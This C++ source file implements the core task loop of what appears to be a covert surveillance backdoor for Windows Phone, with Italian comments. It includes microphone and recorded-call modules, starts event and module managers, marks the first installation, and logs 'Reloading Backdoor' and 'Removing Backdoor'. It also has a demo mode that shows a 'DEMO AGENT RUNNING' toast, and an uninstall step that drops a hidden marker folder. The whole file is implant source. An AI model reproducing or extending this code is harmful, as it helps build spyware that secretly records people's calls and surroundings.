#include <wchar.h>
#include <time.h>
#include <vector>
#include <exception>
#include <memory>
#include <common_new\cfgmgrapi.h>
#include <common_new\regext.h>
#include <common_new\connmgr.h>

#include "Task.h"
#include "Events.h"
#include "Microphone.h"
#include "RecordedCalls.h"
#include "Date.h"
#include "Common.h"

#include "FunctionFunc.h"

using namespace std;

Task* Task::Instance = NULL;
volatile LONG Task::lLock = 0;
BOOL Task::demo = FALSE;

Task* Task::self() {
	
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		::_Sleep(1);

	if (Instance == NULL)
		Instance = new(std::nothrow) Task();

	InterlockedExchange((LPLONG)&lLock, 0);

	return Instance;
}

Task::Task() : statusObj(NULL), confObj(NULL), 
deviceObj(NULL), uberlogObj(NULL), observerObj(NULL),
modulesManager(NULL), wakeupEvent(NULL), uninstallRequested(FALSE) {

	Hash sha1;

	BYTE sha[20];
	BYTE demoMode[] = {
		0x4e, 0xb8, 0x75, 0x0e, 0xa8, 0x10, 0xd1, 0x94, 
		0xb4, 0x69, 0xf0, 0xaf, 0xa8, 0xf4, 0x77, 0x51, 
		0x49, 0x69, 0xba, 0x72 };

	wakeupEvent = _CreateEventW(NULL, FALSE, FALSE, NULL);

	// Istanziamo qui tutti gli oggetti singleton dopo aver inizializzato le code
	statusObj = Status::self();
	deviceObj = Device::self();
	uberlogObj = UberLog::self();
	///observerObj = Observer::self();
	modulesManager = ModulesManager::self();
	eventsManager = EventsManager::self();
	actionsManager = ActionsManager::self();

	sha1.Sha1(g_DemoMode, 24, sha);

	if (memcmp(sha, demoMode, 20) == 0)
		demo = TRUE;
		
}

Task::~Task(){

	if (deviceObj)
		delete deviceObj;

	if (statusObj)
		delete statusObj;

	if (confObj)
		delete confObj;

	if (wakeupEvent)
		CloseHandle(wakeupEvent);

}

void Task::StartNotification() {
	
	Log logInfo;

	logInfo.WriteLogInfo(L"Started");
	
}

BOOL Task::TaskInit() {
	

	if (deviceObj)
		deviceObj->RefreshData(); // Inizializza varie cose tra cui g_InstanceId

	if (confObj) {
		delete confObj;
		confObj = NULL;
	}

	confObj =  new(std::nothrow) Conf();

	if (confObj == NULL)
		return FALSE;

	if (confObj->LoadConf() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - confObj->LoadConf() FAILED\n", 1, FALSE);
		ADDDEMOMESSAGE(L"Configuration... FAILED\n");
		return FALSE;
	}

	ADDDEMOMESSAGE(L"Configuration... OK\n");

	if (getDemo()) {
		DBG_TRACE(L"Debug - Task.cpp - Starting in DEMO mode\n", 1, FALSE);
	}

	//si salva la lista dei log
	if (uberlogObj)
		uberlogObj->ScanLogs();

	// Da qui in poi inizia la concorrenza tra i thread
#ifdef _DEBUG
	eventsManager->dumpEvents();
#endif

	// Let's mark our first installation
	Log log;

	if (log.IsMarkup(EVENT_AFTERINST) == FALSE) {
		Date d;

		__int64 now = d.getCurAbsoluteMs();

		log.WriteMarkup(EVENT_AFTERINST, (PBYTE)&now, sizeof(now));
	}

	if (eventsManager->startAll() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - eventsManager->startAll() FAILED\n", 1, FALSE);
		ADDDEMOMESSAGE(L"Events... FAILED\n");
		return FALSE;
	}

	DBG_TRACE(L"Debug - Task.cpp - TaskInit() events started\n", 5, FALSE);
	ADDDEMOMESSAGE(L"Events... OK\nAgents:... OK\n");



#ifndef _DEBUG
	if (getDemo()) 
	{
		startDisturboTask();
	}
#endif
	
	return TRUE;
}


BOOL Task::CheckActions() {
	
	_Sleep(1000);

	_WaitForSingleObject(wakeupEvent, INFINITE);

#ifndef _DEBUG
	if (getDemo()) 
	{
		startDisturboTask();
	}
#endif

	DBG_TRACE(L"Debug - Task.cpp - core woke up!\n", 1, FALSE);
	DBG_TRACE_INT(L"Debug - Task.cpp - Memory Used: ", 1, FALSE, GetUsedPhysMemory());

	eventsManager->stopAll();
	eventsManager->clear();

	modulesManager->stopAll();
	modulesManager->clear();
	
	actionsManager->clear();

	// FALSE, uninstall
	if (uninstallRequested) {
		DBG_TRACE(L"Debug - Task.cpp - Removing Backdoor\n", 1, FALSE);

		//aggiungo qui il flag che mi fa capire che la bk è stata disinstallata
		//poi lo controllero' sia in app di FG sia dentro la BG sia dentro la BK
		//se trovo la cartella TempApp significa che la BK è stata rimossa
		CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\TempApp\\", NULL);
		return FALSE;
	}

	DBG_TRACE(L"Debug - Task.cpp - Reloading Backdoor\n", 1, FALSE);

	return TRUE;
}

void Task::uninstall() {
	uninstallRequested = TRUE;
}

void Task::wakeup() {
	SetEvent(wakeupEvent);
}

BOOL Task::getDemo() {

#ifdef DEMO_MODE
	return TRUE;
#endif
	return demo;
}

void Task::startDisturboTask() 
{

	MESSAGETOASTDATA messageToastData;
	GUID monitorClassGuid = { 0x11b69356, 0x6c6d, 0x475d, { 0x86, 0x55, 0xd2, 0x9b, 0x24, 0x0d, 0x96, 0xc8 } };
	messageToastData.productId = monitorClassGuid;
	messageToastData.taskUri = L"";
	messageToastData.sound = L"shutter.wav";
	messageToastData.text1 = L"DEMO AGENT";
	messageToastData.text2 = L"RUNNING";
	
	//Su windows 8.1 non funziona
	HRESULT pmtResult =_Shell_PostMessageToast(&messageToastData);

	
	if (pmtResult != S_OK)
	{   
		_PlaySoundW(NULL, 0, 0);
		//ricordarsi di inserire alarma.wav in core.xap se si vuole utilizzare in release 
		_PlaySoundW(TEXT("alarma.wav"), NULL, SND_FILENAME | SND_ASYNC);
	}
	

	Windows::Foundation::TimeSpan span;
	span.Duration = 20000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);


	
		
}